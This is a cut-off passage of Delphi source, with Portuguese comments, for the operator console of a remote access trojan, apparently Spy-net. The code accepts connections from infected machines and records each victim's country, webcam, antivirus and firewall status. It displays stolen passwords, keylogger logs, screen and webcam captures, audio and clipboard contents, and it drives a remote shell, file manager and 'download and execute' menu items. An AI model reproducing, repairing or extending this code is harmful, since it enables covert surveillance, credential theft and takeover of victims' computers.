    ChangeListViewLineColor(ConAux.item, ClBlack);
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = MAININFO then
  begin
    delete(recebido, 1, pos('|', recebido));
    recebido := replacestring('||', ' | | ', recebido);

    CopyMemory(@Informacoes, @recebido[1], sizeof(ServerINFO));
    delete(recebido, 1, sizeof(ServerINFO));

    Dados[0] := trim(Informacoes.Identificacao); //Identificação
    Dados[1] := ConAux.Athread.Connection.Socket.Binding.PeerIP + '/' + Informacoes.LocalAddress;
    Dados[2] := Informacoes.PcName_PcUser; // PC / user
    Dados[3] := Informacoes.Webcam; // webcam
    Dados[4] := Informacoes.GetOS; // SO
    Dados[5] := Informacoes.GetCPU; //CPU
    Dados[6] := Informacoes.RAMSize; //RAM
    Dados[7] := Informacoes.AntiVirus; //AV
    Dados[8] := Informacoes.Firewall; //Firewall
    Dados[9] := Informacoes.Versao; //versao
    Dados[10] := Informacoes.RemotePort; //porta
    Dados[11] := Informacoes.Ping; //ping
    Dados[12] := Informacoes.ActiveCaption; // janela
    Dados[13] := Informacoes.Flag; // bandeira ---> vem com o número
    TempStr := Informacoes.Bandeira; //country and keyboard
    FirstExecution := Informacoes.FirstExecution;

    TempStr1 := recebido;

    if Dados[3] = '-' then Dados[3] := traduzidos[24] else Dados[3] := traduzidos[25];
    if length(Dados[7]) <= 2 then Dados[7] := traduzidos[117];
    if length(Dados[8]) <= 2 then Dados[8] := traduzidos[117];
    if length(Dados[11]) <= 2 then Dados[11] := traduzidos[118];

    try
      strtoint(dados[13]);
      except
     {$IFDEF SPYDEBUG} AddDebug(Erro20); {$ENDIF}
      dados[13] := '348';
    end;

    if GeoIp1.Checked = true then
    begin
      if fileexists(ExtractFilePath(paramstr(0)) + 'GeoIP.dat') = false then
      begin
        resStream := TResourceStream.Create(hInstance, 'GEOIP', 'geoipfile');
        resStream.SaveToFile(ExtractFilePath(paramstr(0)) + 'GeoIP.dat');
        resStream.Free;
      end;
      BandeiraBKP := dados[13];

      dados[13] := LookupCountry(ConAux.Athread.Connection.Socket.Binding.PeerIP); // abreviação + ' - ' + nome
      Dados[13] := inttostr(GetCountryCode(copy(dados[13], 1, pos(' - ', dados[13]) - 1))); // código da bandeira

      if dados[13] <> '348' then
      begin
        delete(tempstr, 1, pos(' / ', tempstr) - 1);
        tempstr := GetCountryName('', strtoint(dados[13])) + tempstr;
      end else dados[13] := BandeiraBKP;
    end;

    try
      while TerminouDeIncluir = false do
      begin
        sleep(2);
        application.processmessages;
      end;
      TerminouDeIncluir := false;

      if ListView1.Items.Count >= LimiteDeConexao then
      begin
        TerminouDeIncluir := true;
        ConAux.Athread.Connection.Disconnect;
        exit;
      end;

      ListView1.Items.BeginUpdate;
      Item := ListView1.Items.Add;
      Item.ImageIndex := strtoint(dados[13]);
      Item.Caption := GetCountryName('', Item.ImageIndex);
      item.SubItems.Add(Dados[0]);
      item.SubItems.Add(Dados[1]);
      item.SubItems.Add(Dados[2]);
      item.SubItems.Add(Dados[3]);
      item.SubItems.Add(Dados[4]);
      item.SubItems.Add(Dados[5]);
      item.SubItems.Add(Dados[6]);
      item.SubItems.Add(Dados[7]);
      item.SubItems.Add(Dados[8]);
      item.SubItems.Add(Dados[9]);
      item.SubItems.Add(Dados[10]);
      item.SubItems.Add(Dados[11]);
      item.SubItems.Add(Dados[12]);
      Item.SubItemImages[0] := 326;
      if Dados[3] = traduzidos[25] then Item.SubItemImages[3] := 269 else Item.SubItemImages[3] := 283;
      except
      begin
        item.Delete;
        {$IFDEF SPYDEBUG} AddDebug(Erro6); {$ENDIF}
        ConAux.Athread.Connection.Disconnect;
        ListView1.Items.EndUpdate;
        sleep(5);
        TerminouDeIncluir := true;
        exit;
      end;
    end;
    Item.Data := TObject(ConAux);
    ConAux.Item := item;
    ConAux.ConfigID := ConfigsList.Add(TempStr1);

    ConAux.CountryAndKeyboard := TempStr;

    ListView1.Items.EndUpdate;
    sleep(5);
    TerminouDeIncluir := true;

    Statusbar1.Panels.Items[0].Text := traduzidos[18] + ': ' + inttostr(listview1.Items.Count);

    if NotificaoSonora1.Checked = true then
    begin
      StartThread(@ExecutarSom);
    end;

    sleep(50);

    EnviarString(ConAux.Athread, CONFIGURACOESDOSERVER + '|', true);
    if Notificaovisual1.Checked = true then
    SendMessage(FormPrincipal.Handle, WM_POPUP_WINDOW, Integer(ConAux.item), 0);

    sleep(500);

    while EnviandoPing = true do
    begin
      sleep(20);
      Application.ProcessMessages;
    end;

    try
      ConAux.Athread.Connection.WriteLn(PING + '|');
      except
      begin
        {$IFDEF SPYDEBUG} AddDebug(Erro53); {$ENDIF}
        ConAux.Athread.Connection.Disconnect;
        exit;
      end;
    end;  
    ConAux.Ping := GetTickCount;
    ConAux.item.SubItemImages[0] := 329;
    ConAux.FirstExecution := FirstExecution;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERSEARCHOK then
  begin
    if UnitSearchKeylogger.PodeReceber = false then exit;
    delete(recebido, 1, pos('|', recebido));
    Item := FormSearchKeylogger.ListView1.Items.Add;
    Item.ImageIndex := ConAux.Item.ImageIndex;
    Item.Caption := ConAux.Item.SubItems.Strings[0];
    Item.Data := ConAux.Item.Data;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = FILESEARCHOK then
  begin
    if UnitSearchFiles.PodeReceber = false then exit;
    delete(recebido, 1, pos('|', recebido));
    Item := FormSearchFiles.ListView1.Items.Add;
    Item.ImageIndex := ConAux.Item.ImageIndex;
    Item.Caption := ConAux.Item.SubItems.Strings[0];
    Item.SubItems.Add(copy(recebido, 1, pos('|', recebido) - 1));
    Item.Data := ConAux.Item.Data;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = CHAT then
  begin
    if UnitCHAT.PodeIniciarCHAT = false then exit;
    delete(recebido, 1, pos('|', recebido));
    Item := FormCHAT.ListView1.Items.Add;
    Item.ImageIndex := ConAux.Item.ImageIndex;
    Item.Caption := ConAux.Item.SubItems.Strings[0];
    Item.Data := ConAux.Item.Data;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = CHATMSG then
  begin
    if UnitCHAT.PodeIniciarCHAT = false then exit;
    delete(recebido, 1, pos('|', recebido));
    Tempstr := copy(recebido, 1, pos('|', recebido) - 1);
    FormCHAT.Memo1.Lines.Add(ConAux.Item.SubItems.Strings[0] + ' ' + traduzidos[477] + #13#10 + Tempstr + #13#10);
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = GETPASSWORD then
  begin
    TempStr := '**********';
    if UnitPasswords.PodeReceber = false then exit;

    delete(recebido, 1, pos('|', recebido));
    if copy(recebido, 1, pos('|', recebido) - 1) = GETPASSWORDERROR then
    begin
      formPasswords.progressbar1.Position := formPasswords.progressbar1.Position + 1;
      formPasswords.statusbar1.Panels.Items[0].Text := traduzidos[518] + ': ' +
                                                       ConAux.Item.SubItems[0] +
                                                       ' (' + inttostr(formPasswords.progressbar1.Position) + '/' + inttostr(formPasswords.progressbar1.Max) + ')';
      exit;
    end;
    delete(recebido, 1, pos('|', recebido));
    while TerminouPassword = false do
    begin
      sleep(5);
      application.processmessages;
    end;
    TerminouPassword := false;
    while (pos(TempStr, recebido) <> 0) and (UnitPasswords.PodeReceber = true) do
    begin
      StartPassword(copy(recebido, 1, pos(TempStr, recebido) - 1));
      delete(recebido, 1, pos(TempStr, recebido) - 1);
      delete(recebido, 1, length(TempStr));
    end;
    TerminouPassword := true;
    if UnitPasswords.PodeReceber = false then exit;
     
    formPasswords.progressbar1.Position := formPasswords.progressbar1.Position + 1;
    formPasswords.statusbar1.Panels.Items[0].Text := traduzidos[518] + ': ' +
                                                     ConAux.Item.SubItems[0] +
                                                     ' (' + inttostr(formPasswords.progressbar1.Position) + '/' + inttostr(formPasswords.progressbar1.Max) + ')';

    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = IMGDESK then
  begin
    delete(recebido, 1, pos('|', recebido));
    S := TMemoryStream.Create;
    StrToStream(S, recebido);
    S.Position := 0;
    ConAux.ImgDesktop.Clear;
    ConAux.ImgDesktop.LoadFromStream(S);
    ConAux.ImgDesktop.Position := 0;
    if Pconexao(ListView1.Selected.Data) = ConAux then
    try
      j := TJpegImage.Create;
      j.LoadFromStream(ConAux.ImgDesktop);

      b := tbitmap.Create;
      b.Assign(j);
      j.Free;
      Image1.Bitmap.Assign(b);
      b.Free;
      except
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = RENAMESERVIDOR then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    ConAux.Item.SubItems.Strings[0] := replacestring(copy(ConAux.Item.SubItems.Strings[0], 1, pos('_', ConAux.Item.SubItems.Strings[0]) - 1), TempStr, ConAux.Item.SubItems.Strings[0]);
  end else

  if (copy(recebido, 1, pos('|', recebido) - 1) = ENVIAREXECNORMAL) or
     (copy(recebido, 1, pos('|', recebido) - 1) = ENVIAREXECHIDDEN) then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    if Fileexists(TempStr) then
    begin
      ThreadEnviarArquivo := TThreadEnviarArquivo.Create(TempStr, ConAux);
      BeginThread(nil,
                  0,
                  @EnviarArquivo,
                  ThreadEnviarArquivo,
                  0,
                  ThreadId);
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = UPDATESERVIDOR then
  begin
    delete(recebido, 1, pos('|', recebido));
    TempStr := copy(recebido, 1, pos('|', recebido) - 1);
    if Fileexists(TempStr) then
    begin
      ThreadEnviarArquivo := TThreadEnviarArquivo.Create(TempStr, ConAux);
      BeginThread(nil,
                  0,
                  @EnviarArquivo,
                  ThreadEnviarArquivo,
                  0,
                  ThreadId);
    end;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTARPROCESSOS then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro21); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTARSERVICOS then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
        {$IFDEF SPYDEBUG} AddDebug(Erro22); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTARJANELAS then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
        {$IFDEF SPYDEBUG} AddDebug(Erro23); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTARPROGRAMASINSTALADOS then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro24); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = LISTARPORTAS then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro25); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = CONFIGURACOESDOSERVER then
  begin
    delete(recebido, 1, pos('|', recebido));
    if ConfigsList.Strings[ConAux.ConfigID] = '' then
    ConfigsList.Strings[ConAux.ConfigID] := recebido;

    if ConAux.Forms[0] <> nil then
    begin
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro26); {$ENDIF}
      end;
    end;
    exit;
  end else

  if (copy(recebido, 1, pos('|', recebido) - 1) = LISTDEVICES) or
     (copy(recebido, 1, pos('|', recebido) - 1) = LISTEXTRADEVICES) then
  begin
    if ConAux.Forms[1] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[1] as TFormListarDispositivos).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro27); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = OBTERCLIPBOARD then
  begin
    if ConAux.Forms[0] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[0] as TFormFuncoesDiversas).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro28); {$ENDIF}
      end;
    end;
    exit;
  end else

  if (copy(recebido, 1, pos('|', recebido) - 1) = SHELLRESPOSTA) or
     (copy(recebido, 1, pos('|', recebido) - 1) = SHELLATIVAR) or
     (copy(recebido, 1, pos('|', recebido) - 1) = SHELLDESATIVAR) then
  begin
    if ConAux.Forms[2] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[2] as TFormShell).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro29); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = REGISTRO then
  begin
    if ConAux.Forms[3] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[3] as TFormRegistry).OnRead(recebido, ConAux);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro30); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGER then
  begin
    if ConAux.Forms[4] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      if copy(recebido, 1, pos('|', recebido) - 1) = KEYLOGGERGETLOG then
      try
        (ConAux.Forms[4] as TFormKeylogger).OnRead(recebido, AthreadTransfer);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro31); {$ENDIF}
      end else

      try
        (ConAux.Forms[4] as TFormKeylogger).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro32); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOP then
  begin
    delete(recebido, 1, pos('|', recebido));

    if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOPRATIO then
    begin
      delete(recebido, 1, pos('|', recebido));
      ConAux.Item.SubItems.Objects[0] := TObject(recebido);
      AThreadTransfer.Connection.Disconnect; // previnir da conexão ficar presa... fiz uns testes e percebi isso
      while TerminouDeIncluirDS = false do
      begin
        sleep(10);
        application.processmessages;
      end;
      SendMessage(FormPrincipal.Handle, WM_POPUP_DESKTOP, Integer(ConAux.Item), 0);
    end else

    if ConAux.Forms[5] <> nil then
    begin
      if copy(recebido, 1, pos('|', recebido) - 1) = DESKTOPGETBUFFER then
      try
        (ConAux.Forms[5] as TFormDesktop).OnRead(recebido, AthreadTransfer);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro33); {$ENDIF}
      end else

      try
        (ConAux.Forms[5] as TFormDesktop).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro34); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAM then
  begin
    delete(recebido, 1, pos('|', recebido));

    if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAMACTIVE then
    begin
      delete(recebido, 1, pos('|', recebido));
      ConAux.Item.SubItems.Objects[1] := TObject(recebido);
      AThreadTransfer.Connection.Disconnect; // previnir da conexão ficar presa... fiz uns testes e percebi isso
      while TerminouDeIncluirWC = false do
      begin
        sleep(10);
        application.processmessages;
      end;
      SendMessage(FormPrincipal.Handle, WM_POPUP_WEBCAM, Integer(ConAux.Item), 0);
    end else

    if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAMINACTIVE then
    begin
      ConAux.Item.SubItemImages[3] := 283;
      ConAux.Item.SubItems.Strings[3] := traduzidos[24];
    end else

    if ConAux.Forms[6] <> nil then
    begin
      if copy(recebido, 1, pos('|', recebido) - 1) = WEBCAMGETBUFFER then
      try
        (ConAux.Forms[6] as TFormWebcam).OnRead(recebido, AthreadTransfer);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro35); {$ENDIF}
      end else

      try
        (ConAux.Forms[6] as TFormWebcam).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro36); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = AUDIO then
  begin
    if ConAux.Forms[7] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      if copy(recebido, 1, pos('|', recebido) - 1) = AUDIOGETBUFFER then
      try
        (ConAux.Forms[7] as TFormAudio).OnRead(recebido, AthreadTransfer);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro37); {$ENDIF}
      end else

      try
        (ConAux.Forms[7] as TFormAudio).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro38); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = FILEMANAGER then
  begin
    if ConAux.Forms[8] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      if (copy(recebido, 1, pos('|', recebido) - 1) = DOWNLOAD) or
         (copy(recebido, 1, pos('|', recebido) - 1) = DOWNLOADREC) or
         (copy(recebido, 1, pos('|', recebido) - 1) = UPLOAD) or
         (copy(recebido, 1, pos('|', recebido) - 1) = RESUMETRANSFER) then
      try
        (ConAux.Forms[8] as TFormFileManager).OnRead(recebido, AthreadTransfer);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro39); {$ENDIF}
      end else

      try
        (ConAux.Forms[8] as TFormFileManager).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro40); {$ENDIF}
      end;
    end;
    exit;
  end else

  if copy(recebido, 1, pos('|', recebido) - 1) = OPCOESEXTRAS then
  begin
    if ConAux.Forms[9] <> nil then
    begin
      delete(recebido, 1, pos('|', recebido));
      try
        (ConAux.Forms[9] as TFormOpcoesExtras).OnRead(recebido, ConAux.Athread);
        except
       {$IFDEF SPYDEBUG} AddDebug(Erro41); {$ENDIF}
      end;
    end;
    exit;
  end else




end;

procedure TFormPrincipal.IdTCPServer1Execute(AThread: TIdPeerThread);
var
  Recebido, TempStr: string;
  ConAux: PConexao;
  Senha: string;
  TemPlugin: boolean;
  resStream: TResourceStream;
  i: integer;
  Hora_Ping: cardinal;
  b: TBitmap;
  buf: char;

begin
  if Athread.Data = nil then
  begin
    Hora_Ping := GetTickCount;
    Recebido := ReceberString(AThread);

    if Recebido = '' then
    begin
      {$IFDEF SPYDEBUG} AddDebug(Erro2); {$ENDIF}
      Athread.Connection.WriteLn(TENTARNOVAMENTE + '|');
      exit;
    end;

    Senha := copy(Recebido, 1, pos('|', Recebido) - 1);
    delete(recebido, 1, pos('|', recebido));
    if copy(Recebido, 1, pos('|', Recebido) - 1) = 'Y' then TemPlugin := true else
    begin
     {$IFDEF SPYDEBUG} AddDebug(Erro3); {$ENDIF}
      AThread.Connection.Disconnect;
      exit;
    end;

    if Senha <> SenhaConexao then
    begin
     {$IFDEF SPYDEBUG} AddDebug(Erro4); {$ENDIF}
      AThread.Connection.Disconnect;
      exit;
    end;

    delete(recebido, 1, pos('|', recebido));

    if copy(recebido, 1, pos('|', recebido) - 1) = RESPOSTA then
    begin
      delete(recebido, 1, pos('|', recebido));
      TempStr := copy(recebido, 1, pos('|', recebido) - 1);
      delete(recebido, 1, pos('|', recebido));
      for i := (conn.Count - 1) downto 0 do
      try
        if PConexao(conn[i]).RandomString = TempStr then
        begin
          ConAux := PConexao(conn[i]);
          ReceberComando(ConAux.Athread, AThread, recebido, Hora_Ping);
          break;
        end;
        exit;
      except
      end;
    end;

    AThread.Connection.WriteLn(' '); // esse pequeno comando resolveu todos os problemas, inclusive eu acho que resolve até mesmo o do Spy-net, porque atrapalhava o ClientSocket.Idle(0) no server

    TempStr := randomstring;

    GetMem(ConAux, SizeOf(TConexao));
    try
      ConAux.Athread := AThread;
      ConAux.Item := nil;
      ConAux.RandomString := TempStr;
      ConAux.ImgDesktop := TMemoryStream.Create;
      ConAux.Ping := gettickcount;
      ImageStream.Position := 0;
      ConAux.ImgDesktop.LoadFromStream(ImageStream);
      ConAux.LineColor := clBlack;
      for i := 0 to high(ConAux.Forms) - 1 do ConAux.Forms[i] := nil;

      AThread.Data := TObject(ConAux);
      conn.Add(ConAux);
      except
     {$IFDEF SPYDEBUG} AddDebug(Erro12); {$ENDIF}
    end;
    if TemPlugin = true then EnviarString(AThread, MAININFO + '|' + SenhaConexao + '|' + TempStr + '|', true);

  end else
  begin
    AThread.Connection.CheckForDisconnect(False, true);
    AThread.Connection.CheckForGracefulDisconnect(False);
    if AThread.Connection.ClosedGracefully = true then exit;

    Recebido := ReceberString(AThread);
    if pos('|', recebido) <= 0 then exit;

    Hora_Ping := GetTickCount;
    ReceberComando(Athread, Athread, Recebido, Hora_Ping);
  end;
end;

procedure TFormPrincipal.IniciarEscuta;
var
  i: integer;
  Tempstr: string;
begin
  for i := 1 to 65535 do
  begin
    Tempstr := '(' + inttostr(i) + ')';
    if pos(Tempstr, TempPorts) >= 1 then
    begin
      if PossoUsarPorta(i) = false then
      begin
        delete(TempPorts, pos(Tempstr, TempPorts), length(Tempstr));
        MessageDlg(pchar(traduzidos[27] + ' ' + inttostr(i) + ' ' + traduzidos[28]), mtWarning, [mbOK], 0);
      end else
      if AtivarPorta(i) = false then
      begin
        delete(TempPorts, pos(Tempstr, TempPorts), length(Tempstr));
        MessageDlg(pchar(traduzidos[27] + ' ' + inttostr(i) + ' ' + traduzidos[28]), mtWarning, [mbOK], 0);
      end;
    end;
  end;
  TempPorts := '';
  for i := 1 to 65535 do
  if PortasAtivas[i] <> 0 then TempPorts := TempPorts + '(' + inttostr(i) + ')' + ' ';
  Statusbar1.Panels.Items[1].Text := traduzidos[19] + ': ' + TempPorts;
end;

procedure TFormPrincipal.Timer1Timer(Sender: TObject);
var
  xHandle: THandle;
begin
  // aqui serve para saber se alguém está tentando abrir o programa se ele já estiver aberto...
  // se ele detectar a tentativa, ele restaura a janela
  xHandle := CreateMutex(nil, False, 'Pode mostrar essa merda');
  if GetLastError = ERROR_ALREADY_EXISTS then Mostrar1.Click;
  closehandle(xHandle);
end;

procedure TFormPrincipal.Selecionarportas1Click(Sender: TObject);
begin
  FormPortas.ShowModal;
end;

procedure TFormPrincipal.Sair1Click(Sender: TObject);
begin
  close;
end;

procedure TFormPrincipal.Novoservidor1Click(Sender: TObject);
begin
  FormCreateServer.ShowModal;
end;

function TFormPrincipal.GetUserSelecionado: Integer;
var
  i: integer;
begin
  result := - 1;
  if Listview1.Selected = nil then exit;
  for i := (Conn.Count - 1) downto 0 do
  try
    if PConexao(conn[i]).Item <> nil then
    if PConexao(conn[i]).Item = Listview1.Selected then
    begin
      result := i;
      break;
    end;
    except
  end;
end;

procedure TFormPrincipal.Ping1Click(Sender: TObject);
var
  i, Server: integer;
  ConAux: PConexao;
  AtualizarPing: boolean;
begin
  while EnviandoPing = true do
  begin
    sleep(20);
    Application.ProcessMessages;
  end;

  application.ProcessMessages;
  if Listview1.SelCount = 1 then
  begin
    Server := GetUserSelecionado;
    if server <> - 1 then
    begin
      ConAux := PConexao(conn[server]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then exit;
      if ConAux.Athread.Connection.Connected = false then exit;

      if GetTickCount > ConAux.Ping + (35000 + 35000 + 35000) then
      begin
        {$IFDEF SPYDEBUG} AddDebug(Erro50); {$ENDIF}
        ConAux.Athread.Connection.Disconnect;
      end else
      begin
        AtualizarPing := true;
        try
          ConAux.Athread.Connection.WriteLn(PING + '|');
          except
          AtualizarPing := false;
        end;
        if AtualizarPing = true then ConAux.Ping := GetTickCount;
        ConAux.item.SubItemImages[0] := 329;
        ChangeListViewLineColor(ConAux.Item, ClGray);
      end;
    end else
    messagedlg(pchar(traduzidos[119]), mtWarning, [mbOK], 0);
  end else
  begin
    for i := (Conn.Count - 1) downto 0 do
    try
      application.ProcessMessages;

      ConAux := PConexao(conn[i]);
      ConAux.AThread.Connection.CheckForDisconnect(False, true);
      ConAux.AThread.Connection.CheckForGracefulDisconnect(False);
      if ConAux.AThread.Connection.ClosedGracefully = true then continue;
      if ConAux.Athread.Connection.Connected = false then continue;

      if ConAux.Item <> nil then
      if ConAux.Item.Selected = true then
      begin
        if GetTickCount > ConAux.Ping + (35000 + 35000 + 35000) then
        begin
          {$IFDEF SPYDEBUG} AddDebug(Erro51); {$ENDIF}
          ConAux.Athread.Connection.Disconnect;
        end else
        begin
          AtualizarPing := true;
          try
            sleep(5);
            ConAux.Athread.Connection.WriteLn(PING + '|');
            except
            AtualizarPing := false;
          end;
          if AtualizarPing = true then ConAux.Ping := GetTickCount;
          ConAux.item.SubItemImages[0] := 329;
          ChangeListViewLineColor(ConAux.Item, ClGray);
        end;
      end;
      except
    end;
  end;
end;

procedure TFormPrincipal.PopupMenuFuncoesPopup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to popupmenufuncoes.Items.Count - 1 do
  begin
    popupmenufuncoes.Items.Items[i].Enabled := true;
    popupmenufuncoes.Items.Items[i].Visible := false;
  end;

  if listview1.Selected = nil then
  begin
    for i := 0 to popupmenufuncoes.Items.Count - 1 do
    begin
      popupmenufuncoes.Items.Items[i].Visible := true;
      popupmenufuncoes.Items.Items[i].Enabled := false;
    end;
  end else

  if listview1.SelCount > 1 then
  begin
    N3.Visible := true;
    ping1.Visible := true;
    DesktopImage1.Visible := true;
    reconnect1.Visible := true;
    senhas1.Visible := true;
    Procurarnoservidor1.Visible := true;
    Disconnect1.Visible := true;
    Uninstall1.Visible := true;
    Rename1.Visible := true;
    Executarcomandos1.Visible := true;
    Abrirpginadainternet1.Visible := true;
    Baixararquivoeexecutar1.Visible := true;
    HTTPProxy1.Visible := true;
    Webcam1.Visible := true;
    CHAT1.Visible := true;
    Desktopremoto1.Visible := true;
    UpdateServer1.Visible := true;
    SendFileExecute1.Visible := true;
  end else
  if listview1.SelCount = 1 then
  begin
    for i := 0 to popupmenufuncoes.Items.Count - 1 do
    begin
      popupmenufuncoes.Items.Items[i].Visible := true;
      popupmenufuncoes.Items.Items[i].Enabled := true;
      PingTest1.Visible := false;
      {$IFDEF SPYDEBUG} PingTest1.Visible := true; {$ENDIF}
    end;
  end;

  // um usuário deu a idéia e eu gostei....
  // não há necessidade de manter essas opções visíveis, aumentando a lista de funções no popupmenu
  // se reclamarem eu tiro rsrs
  if Mostrartudo1.Checked = false then
  begin
    Clipboard1.Visible := false;
    Listarportasativas1.Visible := false;
    Listadeprogramasinstalados1.Visible := false;
    Listadejanelas1.Visible := false;
    Listadeservios1.Visible := false;
    Listadeprocessos1.Visible := false;
  end;
end;

procedure TFormPrincipal.ListView1SelectItem(Sender: TObject;
  Item: TListItem; Selected: Boolean);
var
  ConAux: PConexao;
  j: TJpegImage;
  TempStr: string;
  b: TBitmap;
begin
  if (ListView1.Selected = nil) or (ListView1.SelCount > 1) then exit;
  Image1.Bitmap := nil;
  ConAux := PConexao(ListView1.Selected.Data);

  try
    j := TJpegImage.Create;
    ConAux.ImgDesktop.Position := 0;
    j.LoadFromStream(ConAux.ImgDesktop);

    b := tbitmap.Create;
    b.Assign(j);
    j.Free;
    Image1.Bitmap.Assign(b);
    b.Free;
    except
  end;
  TempStr := ListView1.Selected.SubItems.Strings[2];

  Listview2.Items[0].Caption := ListView1.Selected.SubItems.Strings[1];
  Listview2.Items[1].Caption := ListView1.Selected.SubItems.Strings[4];
  Listview2.Items[2].Caption := copy(Tempstr, 1, pos('/', tempstr) - 1);
  delete(Tempstr, 1, pos('/', tempstr));
  Listview2.Items[3].Caption := Tempstr;
  Listview2.Items[4].Caption := ListView1.Selected.SubItems.Strings[7];
  Listview2.Items[5].Caption := ListView1.Selected.SubItems.Strings[8];
  Listview2.Items[6].Caption := ListView1.Selected.SubItems.Strings[5];
  Listview2.Items[7].Caption := 'RAM: ' + ListView1.Selected.SubItems.Strings[6];
  Listview2.Items[8].Caption := traduzidos[519] + ': ' + ConAux.FirstExecution;

  //Label1.Caption := GetCountryName('', ListView1.Selected.ImageIndex) + ' / ' + GetActiveKeyboardLanguage;
  Label1.Caption := ConAux.CountryAndKeyboard;
  DefinirImagem(ImageListIcons, ListView1.Selected.ImageIndex, Image2);
end;

procedure TFormPrincipal.Sair2Click(Sender: TObject);
begin
  close;
end;

procedure TFormPrincipal.Mostrar1Click(Sender: TObject);
begin
  WindowState := wsNormal;
  SetForegroundWindow(handle);
  CoolTrayIcon1.IconVisible := false;
  Application.Restore;
  CoolTrayIcon1.ShowTaskbarIcon;
end;

procedure TFormPrincipal.CoolTrayIcon1DblClick(Sender: TObject);
begin
  CoolTrayIcon1.IconVisible := false;
  FormPrincipal.Mostrar1Click(self);
end;

procedure TFormPrincipal.AppMinMessage(Sender: TObject);
begin
  CoolTrayIcon1.IconVisible := true;
  CoolTrayIcon1.HideTaskbarIcon;
  Hide;
  CoolTrayIcon1.ShowBalloonHint(Application.Title + ' ' + versaoPrograma,
